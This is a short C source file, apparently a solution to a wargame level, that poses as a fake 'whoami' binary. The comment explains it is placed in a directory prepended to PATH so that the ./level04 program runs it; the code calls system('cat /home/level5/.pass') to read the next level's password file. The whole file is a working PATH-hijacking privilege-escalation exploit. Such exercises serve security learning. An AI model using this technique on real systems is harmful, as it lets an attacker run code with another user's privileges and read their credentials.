/* Fake 'whoami' command.
 * Binary in directory that is prepended to PATH variable when calling ./level04
 */

#include <stdlib.h>

int main() {
    system("cat /home/level5/.pass");
    return 0;
}
